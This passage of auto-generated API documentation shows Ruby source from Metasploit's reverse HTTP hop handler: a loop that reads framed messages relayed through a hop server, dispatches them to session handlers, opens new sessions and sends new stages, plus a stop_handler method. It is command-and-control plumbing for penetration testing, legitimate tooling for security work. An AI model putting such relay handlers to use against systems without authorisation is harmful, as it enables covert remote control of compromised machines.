      <span class='kw'>until</span> <span class='id identifier rubyid_received'>received</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&lt;</span> <span class='int'>12</span> <span class='op'>||</span> <span class='id identifier rubyid_received'>received</span><span class='period'>.</span><span class='id identifier rubyid_slice!'>slice!</span><span class='lparen'>(</span><span class='int'>0</span><span class='comma'>,</span> <span class='const'>MAGIC</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rparen'>)</span> <span class='op'>!=</span> <span class='const'>MAGIC</span>

        <span class='comment'># good response
</span>        <span class='id identifier rubyid_delay'>delay</span> <span class='op'>=</span> <span class='int'>0</span> <span class='comment'># we&#39;re talking, speed up
</span>        <span class='id identifier rubyid_urlen'>urlen</span> <span class='op'>=</span> <span class='id identifier rubyid_received'>received</span><span class='period'>.</span><span class='id identifier rubyid_slice!'>slice!</span><span class='lparen'>(</span><span class='int'>0</span><span class='comma'>,</span><span class='int'>4</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>V</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>
        <span class='id identifier rubyid_urlpath'>urlpath</span> <span class='op'>=</span> <span class='id identifier rubyid_received'>received</span><span class='period'>.</span><span class='id identifier rubyid_slice!'>slice!</span><span class='lparen'>(</span><span class='int'>0</span><span class='comma'>,</span><span class='id identifier rubyid_urlen'>urlen</span><span class='rparen'>)</span>
        <span class='id identifier rubyid_datalen'>datalen</span> <span class='op'>=</span> <span class='id identifier rubyid_received'>received</span><span class='period'>.</span><span class='id identifier rubyid_slice!'>slice!</span><span class='lparen'>(</span><span class='int'>0</span><span class='comma'>,</span><span class='int'>4</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>V</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='lbracket'>[</span><span class='int'>0</span><span class='rbracket'>]</span>

        <span class='comment'># do not want handlers to change while we dispatch this
</span>        <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_lock'>lock</span><span class='period'>.</span><span class='id identifier rubyid_lock'>lock</span>
        <span class='comment'>#received now starts with the binary contents of the message
</span>        <span class='kw'>if</span> <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_handlers'>handlers</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='id identifier rubyid_urlpath'>urlpath</span>
          <span class='id identifier rubyid_pack'>pack</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Proto</span><span class='op'>::</span><span class='const'>Http</span><span class='op'>::</span><span class='const'>Packet</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span>
          <span class='id identifier rubyid_pack'>pack</span><span class='period'>.</span><span class='id identifier rubyid_body'>body</span> <span class='op'>=</span> <span class='id identifier rubyid_received'>received</span><span class='period'>.</span><span class='id identifier rubyid_slice!'>slice!</span><span class='lparen'>(</span><span class='int'>0</span><span class='comma'>,</span><span class='id identifier rubyid_datalen'>datalen</span><span class='rparen'>)</span>
          <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_current_url'>current_url</span> <span class='op'>=</span> <span class='id identifier rubyid_urlpath'>urlpath</span>
          <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_handlers'>handlers</span><span class='lbracket'>[</span><span class='id identifier rubyid_urlpath'>urlpath</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_hop_http'>hop_http</span><span class='comma'>,</span> <span class='id identifier rubyid_pack'>pack</span><span class='rparen'>)</span>
          <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_lock'>lock</span><span class='period'>.</span><span class='id identifier rubyid_unlock'>unlock</span>
        <span class='kw'>elsif</span> <span class='op'>!</span><span class='id identifier rubyid_closed_handlers'>closed_handlers</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span> <span class='id identifier rubyid_urlpath'>urlpath</span>
          <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_lock'>lock</span><span class='period'>.</span><span class='id identifier rubyid_unlock'>unlock</span>
          <span class='comment'>#New session!
</span>          <span class='id identifier rubyid_conn_id'>conn_id</span> <span class='op'>=</span> <span class='id identifier rubyid_urlpath'>urlpath</span><span class='period'>.</span><span class='id identifier rubyid_gsub'>gsub</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
          <span class='comment'># Short-circuit the payload&#39;s handle_connection processing for create_session
</span>          <span class='comment'># We are the dispatcher since we need to handle the comms to the hop
</span>          <span class='id identifier rubyid_create_session'>create_session</span><span class='lparen'>(</span><span class='id identifier rubyid_hop_http'>hop_http</span><span class='comma'>,</span> <span class='lbrace'>{</span>
            <span class='symbol'>:passive_dispatcher</span> <span class='op'>=&gt;</span> <span class='kw'>self</span><span class='comma'>,</span>
            <span class='symbol'>:conn_id</span>            <span class='op'>=&gt;</span> <span class='id identifier rubyid_conn_id'>conn_id</span><span class='comma'>,</span>
            <span class='symbol'>:url</span>                <span class='op'>=&gt;</span> <span class='id identifier rubyid_uri'>uri</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>+</span> <span class='id identifier rubyid_conn_id'>conn_id</span> <span class='op'>+</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/\x00</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span>
            <span class='symbol'>:expiration</span>         <span class='op'>=&gt;</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionExpirationTimeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span>
            <span class='symbol'>:comm_timeout</span>       <span class='op'>=&gt;</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SessionCommunicationTimeout</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span>
            <span class='symbol'>:ssl</span>                <span class='op'>=&gt;</span> <span class='kw'>false</span><span class='comma'>,</span>
          <span class='rbrace'>}</span><span class='rparen'>)</span>
          <span class='comment'># send new stage to hop so next inbound session will get a unique ID.
</span>          <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_send_new_stage'>send_new_stage</span>
        <span class='kw'>else</span>
          <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_lock'>lock</span><span class='period'>.</span><span class='id identifier rubyid_unlock'>unlock</span>
        <span class='kw'>end</span>
      <span class='kw'>end</span>
    <span class='kw'>end</span>
    <span class='id identifier rubyid_hop_http'>hop_http</span><span class='period'>.</span><span class='id identifier rubyid_monitor_thread'>monitor_thread</span> <span class='op'>=</span> <span class='kw'>nil</span> <span class='comment'>#make sure we&#39;re out
</span>    <span class='const'>ReverseHopHttp</span><span class='period'>.</span><span class='id identifier rubyid_hop_handlers'>hop_handlers</span><span class='period'>.</span><span class='id identifier rubyid_delete'>delete</span><span class='lparen'>(</span><span class='id identifier rubyid_full_uri'>full_uri</span><span class='rparen'>)</span>
  <span class='kw'>end</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="stop_handler-instance_method">
  
    - (<tt>Object</tt>) <strong>stop_handler</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Stops the handler and monitoring thread</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


155
156
157
158
159
160
161</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/handler/reverse_hop_http.rb', line 155</span>

<span class='kw'>def</span> <span class='id identifier rubyid_stop_handler'>stop_handler</span>
  <span class='comment'># stop_handler is called like 3 times, don&#39;t decrement refcount unless we&#39;re still running
</span>  <span class='kw'>if</span> <span class='ivar'>@running</span>
    <span class='const'>ReverseHopHttp</span><span class='period'>.</span><span class='id identifier rubyid_hop_handlers'>hop_handlers</span><span class='lbracket'>[</span><span class='id identifier rubyid_full_uri'>full_uri</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_refs'>refs</span> <span class='op'>-=</span> <span class='int'>1</span>
    <span class='ivar'>@running</span> <span class='op'>=</span> <span class='kw'>false</span>
  <span class='kw'>end</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

    <div id="footer">
  Generated on Fri Nov  7 14:50:35 2014 by
  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.8.7.4 (ruby-2.1.4).
</div>

  </body>
</html>